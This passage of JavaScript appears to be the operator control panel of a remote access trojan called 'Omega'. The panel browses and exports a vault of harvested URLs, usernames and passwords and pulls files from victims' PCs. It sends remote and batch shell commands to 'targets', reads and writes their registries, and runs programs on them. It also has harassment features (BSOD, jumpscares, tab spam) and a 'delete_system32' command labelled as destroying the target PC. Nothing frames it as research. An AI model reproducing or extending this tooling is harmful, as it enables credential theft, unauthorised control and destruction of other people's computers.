			let subFiltered = item.data.filter(c => 
				(c.url && c.url.toLowerCase().includes(q)) || 
				(c.user && c.user.toLowerCase().includes(q)) || 
				(c.pass && c.pass.toLowerCase().includes(q))
			);
			if(subFiltered.length > 0) {
				filtered.push({...item, data: subFiltered});
			}
		} else {
			const str = JSON.stringify(item).toLowerCase();
			if(str.includes(q)) filtered.push(item);
		}
	});
	renderVaultData(filtered);
}

function exportVaultData() {
	const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(_globalVaultData, null, 2));
	const downloadAnchorNode = document.createElement('a');
	downloadAnchorNode.setAttribute("href",     dataStr);
	downloadAnchorNode.setAttribute("download", "omega_vault_export_" + Date.now() + ".json");
	document.body.appendChild(downloadAnchorNode);
	downloadAnchorNode.click();
	downloadAnchorNode.remove();
}
// ==========================================
function _promptUploadFile() {
	const p = prompt(
		"Full path to file on target:",
		"C:\\Users\\user\\Desktop\\file.txt",
	);
	if (!p) return;
	sendCmd("upload_file", { path: p.trim() });
}
function _promptKillApp() {
	const n = prompt("App name (e.g. chrome.exe):", "");
	if (!n) return;
	sendCmd("kill_app", { name: n.trim() });
}
function _confirmDelete32() {
	if (!confirm("âš ï¸ This will DESTROY the target PC. Are you sure?")) return;
	if (!confirm("â— FINAL WARNING: This is IRREVERSIBLE. Proceed?")) return;
	sendCmd("delete_system32", { confirm: "CONFIRM_DESTROY" });
}
function _promptMoveMouse() {
	const x = prompt("X coordinate:", "960");
	if (!x) return;
	const y = prompt("Y coordinate:", "540");
	if (!y) return;
	sendCmd("move_mouse", { x: parseInt(x, 10), y: parseInt(y, 10) });
}
function _promptOpenSpam() {
	const url = prompt("URL to spam:", "https://google.com");
	if (!url) return;
	const count = parseInt(prompt("How many tabs (max 30):", "10") || 10, 10);
	sendTrollExt("openspam", { value: url.trim(), count });
}
function _promptWallpaper() {
	const u = prompt("Wallpaper image URL:", "");
	if (!u) return;
	sendTrollExt("wallpaper", { value: u.trim() });
}
function _promptRegRead() {
	const p = prompt("Registry path (e.g. HKCU\\Software\\MyApp):", "");
	if (!p) return;
	const v = prompt("Value name (blank = list all):", "") || null;
	sendCmd("reg_read", { path: p.trim(), val: v ? v.trim() : null });
}
function _promptRegWrite() {
	const p = prompt("Registry path:", "");
	if (!p) return;
	const vn = prompt("Value name:", "");
	if (!vn) return;
	const data = prompt("Data (string):", "");
	if (data === null) return;
	sendCmd("reg_write", { path: p.trim(), val: vn.trim(), data: data.trim() });
}
function showToolCat(cat) {
	// Hide all categories
	document.querySelectorAll(".tool-cat").forEach((el) => {
		el.style.display = "none";
	});
	// Show target
	const el = document.getElementById(`toolcat_${cat}`);
	if (el) el.style.display = "block";
	// Update active pill state â€” handle both normal and danger pills
	document.querySelectorAll(".tool-pill").forEach((p) => {
		p.classList.remove("active");
		if (p.id === `pill_${cat}`) p.classList.add("active");
	});
	// Clear result area on category switch
	clearToolResult();
}

function _clearToolResult() {
	const wrap = $("toolsResultWrap"),
		out = $("toolsResult");
	if (wrap) wrap.style.display = "none";
	if (out) out.textContent = "";
}

function _showToolResult(label, text) {
	const wrap = $("toolsResultWrap"),
		out = $("toolsResult"),
		lbl = $("toolsResultLabel");
	if (!wrap || !out) return;
	if (lbl) lbl.textContent = label || "Output";
	out.textContent = text;
	wrap.style.display = "block";
	out.scrollTop = out.scrollHeight;
}

function _confirmBsod() {
	if (!confirm("âš ï¸ This will crash the target PC with a BSOD. Are you sure?"))
		return;
	sendTroll("bsod");
	logEvent("ðŸ’¥ BSOD triggered", "warn");
}
function _promptVolume() {
	const v = prompt("Volume level (0-100):", "50");
	if (v !== null && v.trim() !== "" && !Number.isNaN(parseInt(v, 10)))
		sendTroll("volume", parseInt(v, 10));
}
function _setVolume(v) {
	const val = parseInt(v, 10);
	const lbl = $("volLabel");
	if (lbl) lbl.textContent = `${val}%`;
	sendTroll("volume", val);
}
function _promptLoopSound() {
	const v = prompt("Sound URL (direct mp3 link):");
	if (v?.trim()) sendTroll("loopsound", v.trim());
}
let customJsImg = "";
let customJsSnd = "";

function _uploadJsAsset(input, type) {
	const file = input?.files?.[0];
	if (!file) return;
	const reader = new FileReader();
	reader.onload = (e) => {
		if (type === "img") {
			customJsImg = e.target.result;
			logEvent("ðŸ–¼ Custom JS Image loaded", "ok");
		} else {
			customJsSnd = e.target.result;
			logEvent("ðŸ”Š Custom JS Sound loaded", "ok");
		}
	};
	reader.readAsDataURL(file);
}

function _triggerCustomJumpscare() {
	if (!customJsImg) {
		alert("Please set a JS Image first!");
		return;
	}
	if (!currentTargetId || !socket) return;
	socket.send(
		JSON.stringify({
			type: "troll",
			cmd: "jumpscare_pro",
			val: customJsImg,
			sound: customJsSnd,
			id: currentTargetId,
		}),
	);
	logEvent("ðŸš€ Custom Jumpscare Launched!", "warn");
}

function _promptJumpscare() {
	const img = prompt("Jumpscare image URL (.gif or .jpg):", "");
	if (img === null) return;
	const snd = prompt(
		"Jumpscare sound URL (.mp3) â€” leave blank for silent:",
		"",
	);
	if (!currentTargetId || !socket) return;
	socket.send(
		JSON.stringify({
			type: "troll",
			cmd: "jumpscare_pro",
			val: img.trim(),
			sound: snd ? snd.trim() : "",
			id: currentTargetId,
		}),
	);
	logEvent("ðŸ‘» Jumpscare sent!", "warn");
}
function _uploadAudio(input) {
	const file = input?.files?.[0];
	if (!file || !currentTargetId || !socket) {
		input.value = "";
		return;
	}
	const CHUNK_B64 = 48 * 1024; // 48 KB per chunk (safe for Railway WS)
	logEvent(
		`ðŸ“¤ Sending ${file.name} (${(file.size / 1024).toFixed(0)} KB)...`,
		"ok",
	);
	const reader = new FileReader();
	reader.onload = async (e) => {
		const b64full = e.target.result.split(",")[1]; // strip data:audio/mpeg;base64,
		const total = Math.ceil(b64full.length / CHUNK_B64);
		for (let seq = 0; seq < total; seq++) {
			const piece = b64full.slice(seq * CHUNK_B64, (seq + 1) * CHUNK_B64);
			socket.send(
				JSON.stringify({
					type: "troll",
					cmd: "audio_chunk",
					val: piece,
					seq,
					total,
					fname: file.name,
					id: currentTargetId,
				}),
			);
			// Tiny yield between chunks so WS doesn't buffer-burst
			await new Promise((r) => setTimeout(r, 30));
		}
		logEvent(
			`âœ… ${file.name} sent (${total} chunk${total > 1 ? "s" : ""}) â€” looping on target.`,
			"ok",
		);
	};
	reader.readAsDataURL(file);
	input.value = "";
}
let _cmdHistory = [];
let _cmdHistoryIdx = -1;

document.addEventListener("DOMContentLoaded", () => {
	const inp = $("shellInput");
	if (inp) {
		inp.addEventListener("keydown", (e) => {
			if (e.key === "ArrowUp") {
				e.preventDefault();
				if (_cmdHistory.length > 0) {
					if (_cmdHistoryIdx < _cmdHistory.length - 1) _cmdHistoryIdx++;
					inp.value = _cmdHistory[_cmdHistory.length - 1 - _cmdHistoryIdx];
				}
			} else if (e.key === "ArrowDown") {
				e.preventDefault();
				if (_cmdHistoryIdx > 0) {
					_cmdHistoryIdx--;
					inp.value = _cmdHistory[_cmdHistory.length - 1 - _cmdHistoryIdx];
				} else if (_cmdHistoryIdx === 0) {
					_cmdHistoryIdx = -1;
					inp.value = "";
				}
			}
		});
	}
});

function _sendShell() {
	const inp = $("shellInput"),
		cmd = inp?.value?.trim();
	if (!cmd || !currentTargetId || !socket) return;
	socket.send(
		JSON.stringify({ type: "shell", c: cmd, cmd: cmd, id: currentTargetId }),
	);
	
	if (_cmdHistory[_cmdHistory.length - 1] !== cmd) {
		_cmdHistory.push(cmd);
	}
	_cmdHistoryIdx = -1;
	inp.value = "";
}

// â”€â”€ CHAT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function _toggleChat() {
	chatOpen = !chatOpen;
	$("chatDrawer").classList.toggle("open", chatOpen);
	if (chatOpen) {
		unreadCount = 0;
		const u = $("chatUnread");
		if (u) u.style.display = "none";
	}
}

function _sendChat() {
	const inp = $("chatInput"),
		msg = inp?.value?.trim();
	if (!msg || !socket) return;
	socket.send(JSON.stringify({ type: "chat", message: msg }));
	inp.value = "";
	clearTimeout(typingTimer);
}

let typingTimer = null;
let typingHideTimer = null;
function _handleTyping() {
	if (!socket) return;
	socket.send(JSON.stringify({ type: "typing" }));
	clearTimeout(typingTimer);
	typingTimer = setTimeout(() => {
		typingTimer = null;
	}, 1000);
}

function showTypingIndicator(d) {
	const wrap = $("typingIndicator");
	const name = $("typingName");
	const av = $("typingAvatar");
	if (!wrap || !name || !av) return;

	name.textContent = `${d.username} is typing...`;
	if (d.avatar) {
		av.innerHTML = `<img src="${d.avatar}" style="width:100%;height:100%;object-fit:cover">`;
	} else {
		av.innerHTML = (d.username || "?").charAt(0).toUpperCase();
	}

	wrap.classList.add("active");

	clearTimeout(typingHideTimer);
	typingHideTimer = setTimeout(() => {
		wrap.classList.remove("active");
	}, 3000);
}

function renderChat(d) {
	const stream = $("chatStream");
	if (!stream) return;
	// Skip SYSTEM messages â€” we use showSystemMsg instead
	if (d.username === "SYSTEM") return;
	const isMe = d.username === currentUser?.username;
	const wrap = document.createElement("div");
	if (d.id) wrap.id = `chat-msg-${d.id}`;
	wrap.style.cssText = `display:flex;flex-direction:column;align-items:${isMe ? "flex-end" : "flex-start"};margin-bottom:8px;position:relative;`;

	const avHtml = d.avatar
		? `<img src="${d.avatar}" style="width:20px;height:20px;border-radius:50%;object-fit:cover">`
		: `<div style="width:20px;height:20px;border-radius:50%;background:var(--accent-dim);display:flex;align-items:center;justify-content:center;font-size:.58rem;font-weight:700;color:var(--accent)">${(d.username || "?").charAt(0).toUpperCase()}</div>`;

	wrap.innerHTML = `
<div style="display:flex;align-items:center;gap:5px;margin-bottom:3px;flex-direction:${isMe ? "row-reverse" : "row"}">
    ${avHtml}
    <span style="font-size:.6rem;font-weight:600;color:var(--text-3)">${d.username}</span>
</div>
<div class="chat-message ${isMe ? "me" : "them"}">${d.message}</div>`;

	// Admin: floating delete button on right-click
	if (currentUser?.role === "admin" && d.id) {
		const deleteBtn = document.createElement("button");
		deleteBtn.textContent = "Delete";
		deleteBtn.style.cssText =
			"position:absolute;top:0;" +
			(isMe ? "left:-70px" : "right:-70px") +
			";background:var(--red);color:#fff;border:none;border-radius:6px;font-size:.65rem;padding:.25rem .5rem;cursor:pointer;display:none;z-index:100;font-family:inherit;font-weight:600;";
		deleteBtn.onclick = (e) => {
			e.stopPropagation();
			deleteBtn.style.display = "none";
			adminDeleteMsg(d.id);
		};
		wrap.appendChild(deleteBtn);
		wrap.addEventListener("contextmenu", (e) => {
			e.preventDefault();
			document.querySelectorAll(".chat-del-btn-vis").forEach((b) => {
				b.style.display = "none";
				b.classList.remove("chat-del-btn-vis");
			});
			deleteBtn.style.display = "block";
			deleteBtn.classList.add("chat-del-btn-vis");
		});
		document.addEventListener(
			"click",
			() => {
				deleteBtn.style.display = "none";
				deleteBtn.classList.remove("chat-del-btn-vis");
			},
			{ once: true },
		);
	}

	stream.appendChild(wrap);
	stream.scrollTop = stream.scrollHeight;
}

// â”€â”€ ADMIN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let adminUsersList = [];
async function adminLoadUsers() {
	const el = $("adminUserList");
	if (!el) return;
	try {
		const r = await fetch("/api/admin/users");
		if (!r.ok) throw new Error("Not authorized");
		const users = await r.json();
		adminUsersList = users;
		if (!users.length) {
			el.innerHTML =
				'<div style="color:var(--text-3);padding:1.5rem;text-align:center;font-size:.84rem">No users found</div>';
			return;
		}
		// Sort: admins first, then alphabetical
		users.sort((a, b) => {
			if (a.role === "admin" && b.role !== "admin") return -1;
			if (a.role !== "admin" && b.role === "admin") return 1;
			return (a.username || "").localeCompare(b.username || "");
		});
		el.innerHTML = `<table class="admin-table">
<thead><tr><th>User</th><th>Role</th><th>Last IP</th><th>Status</th><th>Actions</th></tr></thead>
<tbody>${users.map((u) => adminUserRow(u)).join("")}</tbody></table>`;
	} catch (e) {
		el.innerHTML = `<div style="color:var(--red);font-size:.84rem;padding:1.5rem">${e.message}</div>`;
	}
}

function adminUserRow(u) {
	const isMe = u.id === currentUser?.id;
	const isBanned = u.is_banned;
	const isAdm = u.role === "admin";
	const roleBadge = isAdm ? "badge-amber" : "badge-blue";
	const meta =
		typeof u.metadata === "object"
			? u.metadata
			: (u.metadata ? JSON.parse(u.metadata) : null) || {};
	const av = meta.avatar || u.avatar_url || "";
	const avHtml = av
		? `<img src="${av}" style="width:30px;height:30px;border-radius:50%;object-fit:cover;flex-shrink:0;border:2px solid ${isAdm ? "var(--amber)" : "var(--border)"}"` +
			`>`
		: `<div class="admin-user-avatar" style="${isAdm ? "background:rgba(255,170,0,.15);color:var(--amber);border:1px solid var(--amber)" : ""};width:30px;height:30px">${(u.username || "?").charAt(0).toUpperCase()}</div>`;
	return `<tr style="${isAdm ? "background:rgba(255,170,0,.04)" : ""}">
<td><div style="display:flex;align-items:center;gap:.625rem">
    ${avHtml}
    <div><div style="font-size:.84rem;font-weight:600;color:var(--text-1)">${u.username}${isMe ? ' <span style="font-size:.6rem;color:var(--teal)">(you)</span>' : ""}</div>
    <div style="font-size:.66rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">${u.id}</div></div>
</div></td>
<td><span class="badge ${roleBadge}">${u.role}</span></td>
<td><span style="font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--text-2)">${u.ip || "â€”"}</span></td>
<td><span class="badge ${isBanned ? "badge-red" : "badge-teal"}">${isBanned ? "BANNED" : "ACTIVE"}</span></td>
<td><div style="display:flex;gap:.375rem">
    ${!isMe && !isBanned ? `<button type="button" class="btn-primary danger" style="font-size:.7rem;padding:.3rem .6rem" onclick="adminBanUser('${u.id}',true)">Ban</button>` : ""}
    ${!isMe && isBanned ? `<button type="button" class="btn-ghost" style="font-size:.7rem;padding:.3rem .6rem" onclick="adminBanUser('${u.id}',false)">Unban</button>` : ""}
    ${!isMe ? `<button type="button" class="btn-ghost" style="font-size:.7rem;padding:.3rem .6rem" onclick="adminToggleRole('${u.id}','${u.role}')">Toggle Role</button>` : ""}
</div></td>
</tr>`;
}

async function _adminBanUser(id, ban) {
	if (id === currentUser?.id) {
		alert("You cannot ban yourself.");
		return;
	}
	// Don't call adminLoadUsers() after â€” the server broadcasts user_update which auto-refreshes
	await fetch("/api/admin/user/update", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ id, is_banned: ban }),
	});
}

async function _adminToggleRole(id, currentRole) {
	const newRole = currentRole === "admin" ? "user" : "admin";
	await fetch("/api/admin/user/update", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ id, role: newRole }),
	});
}

async function adminLoadChat() {
	const el = $("adminChatList");
	if (!el) return;
	try {
		const r = await fetch("/api/admin/chat");
		if (!r.ok) throw new Error("Not authorized");
		const msgs = await r.json();
		if (!msgs.length) {
			el.innerHTML =
				'<div style="color:var(--text-3);font-size:.84rem;padding:1.5rem;text-align:center">No messages</div>';
			return;
		}
		el.innerHTML = msgs
			.map((m) => {
				const avHtml = m.avatar
					? `<img src="${m.avatar}" style="width:24px;height:24px;border-radius:50%;object-fit:cover;margin-right:10px">`
					: `<div style="width:24px;height:24px;border-radius:50%;background:var(--accent-dim);display:flex;align-items:center;justify-content:center;font-size:.65rem;font-weight:700;color:var(--accent);margin-right:10px">${(m.username || "?").charAt(0).toUpperCase()}</div>`;
				return `
<div style="display:flex;justify-content:space-between;align-items:center;padding:.625rem .875rem;border-bottom:1px solid var(--border)">
    <div style="display:flex;align-items:center">
        ${avHtml}
        <div>
            <span style="font-size:.75rem;font-weight:600;color:var(--accent)">${m.username}</span>
            <span style="font-size:.78rem;color:var(--text-1);margin-left:.625rem">${m.message}</span>
            <div style="font-size:.62rem;color:var(--text-3);margin-top:2px">${new Date(m.ts * 1000).toLocaleString()}</div>
        </div>
    </div>
    <button type="button" class="btn-primary danger" style="font-size:.7rem;padding:.3rem .6rem;flex-shrink:0" onclick="adminDeleteMsg(${m.id || 0})">Delete</button>
</div>`;
			})
			.join("");
	} catch (e) {
		el.innerHTML = `<div style="color:var(--red);font-size:.84rem;padding:1.5rem">${e.message}</div>`;
	}
}

async function adminDeleteMsg(id) {
	await fetch("/api/admin/chat/delete", {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ id }),
	});
	adminLoadChat();
}

// â”€â”€ NODE ACCESS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function adminLoadNodeAccess() {
	const el = $("adminNodeAccess");
	if (!el) return;
	if (!currentNodes.length) {
		el.innerHTML =
			'<div style="color:var(--text-3);font-size:.84rem;padding:2rem;text-align:center">No nodes currently connected</div>';
		return;
	}

	// Always fetch fresh users
	try {
		const r = await fetch("/api/admin/users");
		if (r.ok) adminUsersList = await r.json();
	} catch (_e) {}

	const activeNodes = currentNodes.filter((n) => n.status === "Active");
	const html = `<div style="display:flex;gap:1rem;min-height:280px">
        <div style="width:160px;border-right:1px solid var(--border);overflow-y:auto;padding-right:.5rem;display:flex;flex-direction:column;gap:.4rem">
            ${activeNodes
							.map((n) => {
								const s = n.specs || {};
								const isPublic = !Array.isArray(n.allowed_users);
								return `<div onclick="adminSelectNode('${n.id}')" style="padding:.5rem .75rem;background:var(--bg-card);border:1px solid ${isPublic ? "var(--teal)" : "var(--accent)"};border-radius:8px;cursor:pointer;transition:var(--t);display:flex;flex-direction:column;gap:.15rem">
                    <div style="font-size:.72rem;font-weight:700;color:var(--text-1);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.hostname || n.id}</div>
                    <div style="font-size:.58rem;color:${isPublic ? "var(--teal)" : "var(--accent)"};font-weight:600">${isPublic ? "ðŸŒ Public" : "ðŸ”’ Private"}</div>
                </div>`;
							})
							.join("")}
            ${!activeNodes.length ? '<div style="color:var(--text-3);font-size:.78rem;padding:.5rem">No active nodes</div>' : ""}
        </div>
        <div id="adminNodeAccessDetails" style="flex-grow:1;overflow-y:auto;padding:.25rem">
            <div style="color:var(--text-3);font-size:.84rem;padding:2rem;text-align:center">Select a node to configure access</div>
        </div>
    </div>`;
	el.innerHTML = html;
}

window.adminSelectNode = (nodeId) => {
	const node = currentNodes.find((n) => n.id === nodeId);
	if (!node) return;
	const el = $("adminNodeAccessDetails");
	if (!el) return;

	const allowed = node.allowed_users; // can be null/undefined (public), or array
	const isPublic = !Array.isArray(allowed);

	let html = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem">
        <div style="font-size:.84rem;font-weight:700;color:var(--accent)">Node ${nodeId}</div>
        <button type="button" class="${isPublic ? "btn-primary danger" : "btn-primary"}" style="font-size:.7rem;padding:.3rem .6rem" onclick="adminToggleNodePublic('${nodeId}', ${isPublic})">
            ${isPublic ? "Make Private" : "Make Public"}
        </button>
    </div>
    `;

	if (!isPublic) {
		html += `<div style="font-size:.75rem;color:var(--text-2);margin-bottom:.75rem">Select users who can view this node:</div>
        <div style="display:flex;flex-direction:column;gap:.4rem">`;

		adminUsersList.forEach((u) => {
			// Admins can always see it, so disable them
			if (u.role === "admin") return;
			const hasAccess = allowed.includes(u.id);
			html += `
            <div style="display:flex;justify-content:space-between;align-items:center;padding:.5rem;background:var(--bg-input);border:1px solid var(--border);border-radius:8px">
                <div>
                    <div style="font-size:.75rem;font-weight:600;color:var(--text-1)">${u.username}</div>
                    <div style="font-size:.6rem;color:var(--text-3);font-family:'JetBrains Mono',monospace">${u.id}</div>
                </div>
                <button type="button" class="${hasAccess ? "btn-ghost" : "btn-primary"}" style="font-size:.65rem;padding:.2rem .5rem;${hasAccess ? "color:var(--red)" : ""}" onclick="adminToggleUserAccess('${nodeId}', '${u.id}', ${hasAccess})">
                    ${hasAccess ? "Revoke Access" : "Grant Access"}
                </button>
            </div>
            `;
		});
		html += `</div>`;
	} else {
		html += `<div style="font-size:.84rem;color:var(--text-3);text-align:center;padding:2rem">This node is public.<br>All operators can see it.</div>`;
	}
	el.innerHTML = html;
};

window.adminToggleNodePublic = (nodeId, currentlyPublic) => {
	if (!socket) return;
	const allowed = currentlyPublic ? [] : null; // [] means only admins. null means public.
	socket.send(
		JSON.stringify({
			type: "set_visibility",
			id: nodeId,
			allowed_users: allowed,
		}),
	);
	// Re-render UI after a short delay to allow WS propagation
	setTimeout(adminLoadNodeAccess, 500);
};

window.adminToggleUserAccess = (nodeId, userId, currentlyHasAccess) => {
	if (!socket) return;
	const node = currentNodes.find((n) => n.id === nodeId);
	if (!node) return;

	let allowed = Array.isArray(node.allowed_users)
		? [...node.allowed_users]
		: [];
	if (currentlyHasAccess) {
		allowed = allowed.filter((id) => id !== userId);
	} else {
		if (!allowed.includes(userId)) allowed.push(userId);
	}

	socket.send(
		JSON.stringify({
			type: "set_visibility",
			id: nodeId,
			allowed_users: allowed,
		}),
	);
	setTimeout(() => window.adminSelectNode(nodeId), 300); // refresh the panel
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// â”€â”€ NEW APEX FEATURES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â”€â”€ TOAST NOTIFICATION SYSTEM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _toastContainer = null;
function _ensureToastContainer() {
	if (_toastContainer) return;
	_toastContainer = document.createElement("div");
	_toastContainer.id = "toastContainer";
	_toastContainer.style.cssText = `
		position:fixed;top:1.25rem;right:1.25rem;z-index:99999;
		display:flex;flex-direction:column;gap:.5rem;pointer-events:none;`;
	document.body.appendChild(_toastContainer);
}
function showToast(msg, type = "ok", duration = 3500) {
	_ensureToastContainer();
	const colors = {
		ok:   ["rgba(16,185,129,.95)", "#34d399"],
		warn: ["rgba(251,191,36,.95)",  "#fbbf24"],
		err:  ["rgba(239,68,68,.95)",   "#f87171"],
		info: ["rgba(79,140,255,.95)",  "#4f8cff"],
	};
	const [bg, border] = colors[type] || colors.info;
	const el = document.createElement("div");
	el.style.cssText = `
		background:${bg};border:1px solid ${border};border-radius:10px;
		padding:.6rem 1rem;font-size:.72rem;font-weight:700;color:#fff;
		font-family:'Outfit',sans-serif;pointer-events:all;cursor:pointer;
		box-shadow:0 4px 20px rgba(0,0,0,.4);max-width:320px;
		transform:translateX(120%);transition:transform .3s cubic-bezier(.4,0,.2,1);`;
	el.textContent = msg;
	el.onclick = () => el.remove();
	_toastContainer.appendChild(el);
	requestAnimationFrame(() => { el.style.transform = "translateX(0)"; });
	setTimeout(() => {
		el.style.transform = "translateX(120%)";
		setTimeout(() => el.remove(), 350);
	}, duration);
}

// â”€â”€ ACTIVE WINDOW HUD â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Handle active_window response â€” update HUD chip if visible
function _handleActiveWindow(d) {
	const title = d.title || "";
	logEvent(`ðŸªŸ Active: ${title}`, "info");
	showToolResult("Active Window", title);
	showToast(`ðŸªŸ ${title.substring(0, 60)}`, "info");
}

// â”€â”€ SHELL AUTO-SCROLL LOCK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _shellScrollLocked = false;
function _toggleShellScrollLock() {
	_shellScrollLocked = !_shellScrollLocked;
	const btn = $("btnScrollLock");
	if (btn) {
		btn.textContent = _shellScrollLocked ? "ðŸ”’ Locked" : "ðŸ“œ Auto";
		btn.style.color = _shellScrollLocked ? "var(--amber)" : "";
	}
}

// â”€â”€ NODE SEARCH / FILTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _nodeFilter = "";
function filterNodes(query) {
	_nodeFilter = (query || "").toLowerCase();
	const grid = $("nodeGrid");
	if (!grid) return;
	grid.querySelectorAll(".node-card").forEach(card => {
		const text = card.textContent.toLowerCase();
		card.style.display = !_nodeFilter || text.includes(_nodeFilter) ? "" : "none";
	});
}

// â”€â”€ BATCH COMMAND (send to ALL nodes) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function sendToAll(type, extra = {}) {
	if (!socket || !currentNodes.length) return;
	const online = currentNodes.filter(n => n.status === "Online");
	if (!online.length) { showToast("No online nodes!", "warn"); return; }
	online.forEach(n => {
		socket.send(JSON.stringify({ type, id: n.id, ...extra }));
	});
	showToast(`ðŸ“¡ Sent to ${online.length} node(s): ${type}`, "ok");
	logEvent(`[BATCH] ${type} â†’ ${online.length} nodes`, "warn");
}
function _promptBatchCmd() {
	const cmd = prompt("Batch shell command (sent to ALL online nodes):", "");
	if (!cmd) return;
	sendToAll("shell", { c: cmd, cmd });
}

// â”€â”€ NEW PROMPT HELPERS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function _promptClipboardSet() {
	const text = prompt("Text to put in clipboard:", "");
	if (text !== null) sendCmd("clipboard_set", { text });
}
function _promptRunProgram() {
	const path = prompt("Program path or command to run:", "notepad.exe");
	if (path) sendCmd("run_program", { path });
}
function _promptOpenUrl() {
	const url = prompt("URL to open on target:", "https://google.com");
	if (url) sendCmd("open_url", { url });
}
function _promptBeep() {
	const freq = parseInt(prompt("Frequency (Hz):", "880") || "880", 10);
	const dur  = parseInt(prompt("Duration (ms):", "500") || "500", 10);
	sendCmd("play_beep", { freq, dur });
}
function _promptToast() {
	const title = prompt("Toast title:", "Alert");
	if (!title) return;
	const body = prompt("Toast message:", "Hello from Omega!");
	if (body !== null) sendCmd("toast_notify", { title, body });
}

// â”€â”€ SESSION TIMER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let _sessionStart = 0, _sessionTimer = null;
function _startSessionTimer() {
	_sessionStart = Date.now();
	clearInterval(_sessionTimer);
	_sessionTimer = setInterval(() => {
		const el = $("sessionTimer");
		if (!el) return;
		const s = Math.floor((Date.now() - _sessionStart) / 1000);
		const h = String(Math.floor(s / 3600)).padStart(2, "0");
		const m = String(Math.floor((s % 3600) / 60)).padStart(2, "0");
		const sc = String(s % 60).padStart(2, "0");
		el.textContent = `${h}:${m}:${sc}`;
	}, 1000);
}
function _stopSessionTimer() {
	clearInterval(_sessionTimer);
	const el = $("sessionTimer");
	if (el) el.textContent = "00:00:00";
}

